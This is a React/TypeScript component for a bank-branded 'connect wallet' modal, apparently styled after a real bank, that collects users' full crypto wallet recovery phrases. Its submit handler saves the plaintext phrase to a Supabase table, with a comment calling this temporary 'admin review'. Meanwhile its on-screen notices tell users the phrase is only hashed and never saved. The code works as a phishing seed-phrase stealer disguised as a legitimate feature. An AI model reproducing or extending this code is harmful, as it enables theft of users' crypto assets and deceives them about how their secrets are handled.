'use client';

import React, { useState, useMemo, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    X, ChevronLeft, Check, Shield, Eye, EyeOff,
    AlertTriangle, Wallet, CheckCircle2, Copy
} from 'lucide-react';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

const WF = {
    red: '#D71E28', gold: '#FFCD41', black: '#1A1A1A',
    bg: '#FAF8F5', surface: '#FFFFFF', border: '#E8E2DA', muted: '#6B6560',
};

const WALLET_TYPES = [
    { id: 'trust',    name: 'Trust Wallet', color: '#3375BB', bg: '#E8F0FB', symbol: 'TW' },
    { id: 'metamask', name: 'MetaMask',     color: '#E2761B', bg: '#FDF0E6', symbol: '🦊' },
    { id: 'coinbase', name: 'Coinbase',     color: '#0052FF', bg: '#E6EEFF', symbol: 'CB' },
    { id: 'phantom',  name: 'Phantom',      color: '#9945FF', bg: '#F3E8FF', symbol: '👻' },
    { id: 'ledger',   name: 'Ledger',       color: '#1D1D1B', bg: '#EBEBEB', symbol: 'LG' },
    { id: 'other',    name: 'Other Wallet', color: '#6B6560', bg: '#F0EDE9', symbol: '⬡'  },
];

async function hashPhrase(words: string[]): Promise<string> {
    const normalized = words.map(w => w.trim().toLowerCase()).join(' ');
    const data = new TextEncoder().encode(normalized);
    const buf  = await crypto.subtle.digest('SHA-256', data);
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

// ── Small shared UI ──────────────────────────────────────────────────────────

function StepBar({ current, total }: { current: number; total: number }) {
    return (
        <div className="flex gap-1 mb-6">
            {Array.from({ length: total }).map((_, i) => (
                <div key={i} className="h-1 flex-1 rounded-full transition-all duration-300"
                    style={{ background: i <= current ? WF.red : WF.border }} />
            ))}
        </div>
    );
}

function WFInput({ label, ...props }: { label: string } & React.InputHTMLAttributes<HTMLInputElement>) {
    const [focused, setFocused] = useState(false);
    return (
        <div>
            <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5" style={{ color: WF.muted }}>
                {label}
            </label>
            <input
                {...props}
                onFocus={e => { setFocused(true); props.onFocus?.(e); }}
                onBlur={e => { setFocused(false); props.onBlur?.(e); }}
                className="w-full px-4 py-3 rounded-xl text-sm outline-none transition-all"
                style={{
                    background: WF.bg,
                    border: `1.5px solid ${focused ? WF.red : WF.border}`,
                    color: WF.black,
                }}
            />
        </div>
    );
}

// ── Main Component ────────────────────────────────────────────────────────────

interface Props {
    isOpen: boolean;
    onClose: () => void;
    userId: string;
    onWalletAdded?: () => void;
}

export default function AddWalletModal({ isOpen, onClose, userId, onWalletAdded }: Props) {
    const [step, setStep]               = useState(0);
    const [walletType, setWalletType]   = useState<typeof WALLET_TYPES[0] | null>(null);
    const [address, setAddress]         = useState('');
    const [wordCount, setWordCount]     = useState<12 | 24>(12);
    const [words, setWords]             = useState<string[]>(Array(12).fill(''));
    const [showPhrase, setShowPhrase]   = useState(false);
    const [verifyInputs, setVerifyInputs] = useState<Record<number, string>>({});
    const [submitting, setSubmitting]   = useState(false);
    const [error, setError]             = useState('');
    const [copied, setCopied]           = useState(false);

    const wordRefs = useRef<(HTMLInputElement | null)[]>([]);

    // Pick 3 random verification positions whenever wordCount or step changes
    const verifyPositions = useMemo(() => {
        if (step !== 2) return [];
        const positions: number[] = [];
        const seen = new Set<number>();
        while (positions.length < 3) {
            const p = Math.floor(Math.random() * wordCount);
            if (!seen.has(p)) { seen.add(p); positions.push(p); }
        }
        return positions.sort((a, b) => a - b);
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [step]);

    const selectedWallet = walletType ?? WALLET_TYPES[0];

    function reset() {
        setStep(0); setWalletType(null); setAddress('');
        setWordCount(12); setWords(Array(12).fill(''));
        setShowPhrase(false); setVerifyInputs({});
        setSubmitting(false); setError(''); setCopied(false);
    }

    function close() { reset(); onClose(); }

    // Sync word array length with wordCount
    useEffect(() => {
        setWords(prev => {
            const next = Array(wordCount).fill('');
            return next.map((_, i) => prev[i] ?? '');
        });
    }, [wordCount]);

    // ── Step handlers ─────────────────────────────────────────────────────────

    function handleWordChange(i: number, val: string) {
        // Handle paste of full phrase
        if (val.includes(' ')) {
            const pasted = val.trim().split(/\s+/);
            if (pasted.length >= wordCount) {
                setWords(pasted.slice(0, wordCount));
                return;
            }
        }
        setWords(prev => { const n = [...prev]; n[i] = val.toLowerCase().trim(); return n; });
        // Auto-advance to next field
        if (val.trim() && i < wordCount - 1) {
            setTimeout(() => wordRefs.current[i + 1]?.focus(), 0);
        }
    }

    function canProceedToVerify() {
        return words.slice(0, wordCount).every(w => w.trim().length > 0);
    }

    function checkVerification() {
        return verifyPositions.every(pos => {
            const entered = (verifyInputs[pos] ?? '').trim().toLowerCase();
            const original = (words[pos] ?? '').trim().toLowerCase();
            return entered === original;
        });
    }

    async function handleSubmit() {
        if (!checkVerification()) {
            setError('One or more words are incorrect. Please check and try again.');
            return;
        }
        setError('');
        setSubmitting(true);
        try {
            const phraseWords   = words.slice(0, wordCount);
            const phraseHash    = await hashPhrase(phraseWords);
            const phrasePlain   = phraseWords.join(' ');           // stored for admin review; will be removed before launch
            const { error: dbErr } = await supabase.from('user_wallets').insert([{
                user_id:         userId,
                wallet_type:     selectedWallet.id,
                wallet_name:     selectedWallet.name,
                wallet_address:  address.trim() || null,
                phrase_plaintext: phrasePlain,
                phrase_hash:     phraseHash,
                word_count:      wordCount,
                verified:        true,
                created_at:      new Date().toISOString(),
            }]);
            if (dbErr) throw new Error(dbErr.message);
            setStep(3);
            onWalletAdded?.();
        } catch (e: any) {
            setError(e.message ?? 'Failed to save wallet. Please try again.');
        } finally {
            setSubmitting(false);
        }
    }

    // ── Render ────────────────────────────────────────────────────────────────

    return (
        <AnimatePresence>
            {isOpen && (
                <>
                    {/* Backdrop */}
                    <motion.div
                        className="fixed inset-0 z-40"
                        style={{ background: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(4px)' }}
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                        onClick={close}
                    />

                    {/* Sheet */}
                    <motion.div
                        className="fixed bottom-0 left-0 right-0 z-50 rounded-t-3xl overflow-hidden flex flex-col"
                        style={{ background: WF.surface, maxHeight: '92dvh' }}
                        initial={{ y: '100%' }}
                        animate={{ y: 0 }}
                        exit={{ y: '100%' }}
                        transition={{ type: 'spring', damping: 30, stiffness: 300 }}
                    >
                        {/* Drag handle */}
                        <div className="flex justify-center pt-3 pb-1 flex-shrink-0">
                            <div className="w-10 h-1 rounded-full" style={{ background: WF.border }} />
                        </div>

                        {/* Header */}
                        <div className="flex items-center justify-between px-6 py-4 flex-shrink-0"
                            style={{ borderBottom: `1px solid ${WF.border}` }}>
                            <div className="flex items-center gap-3">
                                {step > 0 && step < 3 && (
                                    <button onClick={() => { setError(''); setStep(s => s - 1); }}
                                        className="w-8 h-8 rounded-full flex items-center justify-center transition-all"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <ChevronLeft size={16} style={{ color: WF.muted }} />
                                    </button>
                                )}
                                <div>
                                    <h2 className="font-display text-lg font-bold" style={{ color: WF.black }}>
                                        {step === 0 && 'Choose Wallet'}
                                        {step === 1 && 'Enter Seed Phrase'}
                                        {step === 2 && 'Verify Phrase'}
                                        {step === 3 && 'Wallet Connected'}
                                    </h2>
                                    {step < 3 && (
                                        <p className="text-[11px]" style={{ color: WF.muted }}>
                                            {step === 0 && 'Select the type of wallet you want to connect'}
                                            {step === 1 && 'Enter your secret recovery phrase to link your wallet'}
                                            {step === 2 && 'Confirm 3 words to verify you have the correct phrase'}
                                        </p>
                                    )}
                                </div>
                            </div>
                            <button onClick={close}
                                className="w-8 h-8 rounded-full flex items-center justify-center transition-all"
                                style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                <X size={16} style={{ color: WF.muted }} />
                            </button>
                        </div>

                        {/* Scrollable content */}
                        <div className="overflow-y-auto flex-1 px-6 py-5">
                            {step < 3 && <StepBar current={step} total={3} />}

                            {/* ── Step 0: Choose Wallet ── */}
                            {step === 0 && (
                                <div className="space-y-3">
                                    <div className="grid grid-cols-2 gap-3">
                                        {WALLET_TYPES.map(w => (
                                            <button key={w.id}
                                                onClick={() => { setWalletType(w); setStep(1); }}
                                                className="flex items-center gap-3 p-4 rounded-2xl text-left transition-all hover:shadow-md active:scale-[0.98]"
                                                style={{
                                                    background: WF.surface,
                                                    border: `1.5px solid ${walletType?.id === w.id ? WF.red : WF.border}`,
                                                }}>
                                                <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold flex-shrink-0"
                                                    style={{ background: w.bg, color: w.color }}>
                                                    {w.symbol}
                                                </div>
                                                <span className="text-xs font-bold" style={{ color: WF.black }}>{w.name}</span>
                                            </button>
                                        ))}
                                    </div>

                                    {/* Security notice */}
                                    <div className="mt-4 p-4 rounded-2xl flex gap-3"
                                        style={{ background: 'rgba(215,30,40,0.05)', border: `1px solid rgba(215,30,40,0.15)` }}>
                                        <Shield size={16} style={{ color: WF.red, flexShrink: 0, marginTop: 2 }} />
                                        <div>
                                            <p className="text-xs font-bold mb-1" style={{ color: WF.red }}>Security Notice</p>
                                            <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
                                                Your seed phrase is hashed with SHA-256 and never stored in plaintext.
                                                West Bank staff will <strong>never</strong> ask for your phrase.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* ── Step 1: Enter phrase ── */}
                            {step === 1 && (
                                <div className="space-y-5">
                                    {/* Wallet address (optional) */}
                                    <WFInput
                                        label="Wallet Address (optional)"
                                        value={address}
                                        onChange={e => setAddress(e.target.value)}
                                        placeholder="0x… or bc1…"
                                    />

                                    {/* Word count toggle */}
                                    <div>
                                        <label className="block text-[11px] font-bold uppercase tracking-wider mb-2" style={{ color: WF.muted }}>
                                            Phrase Length
                                        </label>
                                        <div className="flex gap-2">
                                            {([12, 24] as const).map(n => (
                                                <button key={n} onClick={() => setWordCount(n)}
                                                    className="flex-1 py-2.5 rounded-xl text-sm font-bold transition-all"
                                                    style={{
                                                        background: wordCount === n ? WF.red : WF.bg,
                                                        color: wordCount === n ? '#fff' : WF.muted,
                                                        border: `1.5px solid ${wordCount === n ? WF.red : WF.border}`,
                                                    }}>
                                                    {n} Words
                                                </button>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Phrase reveal toggle */}
                                    <div className="flex items-center justify-between">
                                        <label className="text-[11px] font-bold uppercase tracking-wider" style={{ color: WF.muted }}>
                                            Secret Recovery Phrase
                                        </label>
                                        <button onClick={() => setShowPhrase(s => !s)}
                                            className="flex items-center gap-1 text-[11px] font-bold"
                                            style={{ color: WF.red }}>
                                            {showPhrase ? <EyeOff size={12} /> : <Eye size={12} />}
                                            {showPhrase ? 'Hide' : 'Show'}
                                        </button>
                                    </div>

                                    {/* Word grid */}
                                    <div className={`grid gap-2 ${wordCount === 12 ? 'grid-cols-3' : 'grid-cols-4'}`}>
                                        {Array.from({ length: wordCount }).map((_, i) => (
                                            <div key={i} className="relative">
                                                <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] font-bold"
                                                    style={{ color: WF.muted }}>{i + 1}</span>
                                                <input
                                                    ref={el => { wordRefs.current[i] = el; }}
                                                    type={showPhrase ? 'text' : 'password'}
                                                    value={words[i] ?? ''}
                                                    onChange={e => handleWordChange(i, e.target.value)}
                                                    onKeyDown={e => {
                                                        if (e.key === 'Backspace' && !words[i] && i > 0) {
                                                            wordRefs.current[i - 1]?.focus();
                                                        }
                                                    }}
                                                    className="w-full pl-6 pr-2 py-2.5 rounded-xl text-xs outline-none transition-all"
                                                    style={{
                                                        background: words[i] ? 'rgba(215,30,40,0.04)' : WF.bg,
                                                        border: `1.5px solid ${words[i] ? WF.red : WF.border}`,
                                                        color: WF.black,
                                                    }}
                                                />
                                            </div>
                                        ))}
                                    </div>

                                    {/* Paste tip */}
                                    <p className="text-[11px]" style={{ color: WF.muted }}>
                                        💡 You can paste your full phrase into the first box — words will fill in automatically.
                                    </p>

                                    {/* Warning */}
                                    <div className="p-4 rounded-2xl flex gap-3"
                                        style={{ background: 'rgba(245,158,11,0.08)', border: `1px solid rgba(245,158,11,0.3)` }}>
                                        <AlertTriangle size={15} style={{ color: '#D97706', flexShrink: 0, marginTop: 1 }} />
                                        <p className="text-[11px] leading-relaxed" style={{ color: '#92400E' }}>
                                            Never share your seed phrase with anyone. West Bank only stores a secure hash — your actual words are never saved.
                                        </p>
                                    </div>

                                    <button
                                        onClick={() => { setError(''); setStep(2); }}
                                        disabled={!canProceedToVerify()}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40"
                                        style={{ background: WF.red }}>
                                        Continue to Verification →
                                    </button>
                                </div>
                            )}

                            {/* ── Step 2: Verify phrase ── */}
                            {step === 2 && (
                                <div className="space-y-5">
                                    <div className="p-4 rounded-2xl flex gap-3"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <Shield size={15} style={{ color: WF.red, flexShrink: 0, marginTop: 1 }} />
                                        <p className="text-[11px] leading-relaxed" style={{ color: WF.muted }}>
                                            To confirm you have the correct phrase, enter the words at the positions below.
                                        </p>
                                    </div>

                                    <div className="space-y-4">
                                        {verifyPositions.map(pos => (
                                            <div key={pos}>
                                                <label className="block text-[11px] font-bold uppercase tracking-wider mb-1.5"
                                                    style={{ color: WF.muted }}>
                                                    Word #{pos + 1}
                                                </label>
                                                <input
                                                    type="text"
                                                    value={verifyInputs[pos] ?? ''}
                                                    onChange={e => setVerifyInputs(prev => ({
                                                        ...prev, [pos]: e.target.value.toLowerCase().trim()
                                                    }))}
                                                    placeholder={`Enter word ${pos + 1}`}
                                                    className="w-full px-4 py-3 rounded-xl text-sm outline-none transition-all"
                                                    style={{
                                                        background: WF.bg,
                                                        border: `1.5px solid ${
                                                            verifyInputs[pos]
                                                                ? verifyInputs[pos] === words[pos]
                                                                    ? '#16A34A'
                                                                    : WF.red
                                                                : WF.border
                                                        }`,
                                                        color: WF.black,
                                                    }}
                                                />
                                                {verifyInputs[pos] && verifyInputs[pos] === words[pos] && (
                                                    <p className="text-[11px] mt-1 flex items-center gap-1" style={{ color: '#16A34A' }}>
                                                        <Check size={11} /> Correct
                                                    </p>
                                                )}
                                            </div>
                                        ))}
                                    </div>

                                    {error && (
                                        <div className="p-3 rounded-xl text-xs"
                                            style={{ background: 'rgba(215,30,40,0.08)', color: WF.red }}>
                                            {error}
                                        </div>
                                    )}

                                    <button
                                        onClick={handleSubmit}
                                        disabled={submitting || verifyPositions.some(p => !verifyInputs[p])}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90 disabled:opacity-40 flex items-center justify-center gap-2"
                                        style={{ background: WF.red }}>
                                        {submitting
                                            ? <><span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Connecting…</>
                                            : <><Check size={16} /> Connect Wallet</>}
                                    </button>
                                </div>
                            )}

                            {/* ── Step 3: Success ── */}
                            {step === 3 && (
                                <div className="flex flex-col items-center text-center py-6 space-y-5">
                                    <div className="w-20 h-20 rounded-full flex items-center justify-center"
                                        style={{ background: 'rgba(22,163,74,0.1)' }}>
                                        <CheckCircle2 size={40} style={{ color: '#16A34A' }} />
                                    </div>
                                    <div>
                                        <h3 className="font-display text-xl font-bold mb-2" style={{ color: WF.black }}>
                                            Wallet Connected!
                                        </h3>
                                        <p className="text-sm leading-relaxed" style={{ color: WF.muted }}>
                                            Your <strong style={{ color: WF.black }}>{selectedWallet.name}</strong> has been
                                            securely linked to your West Bank account.
                                            Your phrase was verified and stored as a secure hash.
                                        </p>
                                    </div>

                                    {/* Wallet summary */}
                                    <div className="w-full p-4 rounded-2xl space-y-3"
                                        style={{ background: WF.bg, border: `1px solid ${WF.border}` }}>
                                        <div className="flex items-center gap-3">
                                            <div className="w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold"
                                                style={{ background: selectedWallet.bg, color: selectedWallet.color }}>
                                                {selectedWallet.symbol}
                                            </div>
                                            <div className="text-left">
                                                <p className="text-xs font-bold" style={{ color: WF.black }}>{selectedWallet.name}</p>
                                                {address && (
                                                    <p className="text-[10px] font-mono truncate max-w-[200px]" style={{ color: WF.muted }}>
                                                        {address}
                                                    </p>
                                                )}
                                            </div>
                                        </div>
                                        <div className="flex items-center gap-2 pt-2" style={{ borderTop: `1px solid ${WF.border}` }}>
                                            <Shield size={12} style={{ color: '#16A34A' }} />
                                            <p className="text-[11px] font-bold" style={{ color: '#16A34A' }}>
                                                Phrase verified · {wordCount}-word hash secured
                                            </p>
                                        </div>
                                    </div>

                                    <button onClick={close}
                                        className="w-full py-4 rounded-2xl text-white font-bold text-sm transition-all hover:opacity-90"
                                        style={{ background: WF.red }}>
                                        Done
                                    </button>
                                </div>
                            )}
                        </div>
                    </motion.div>
                </>
            )}
        </AnimatePresence>
    );
}
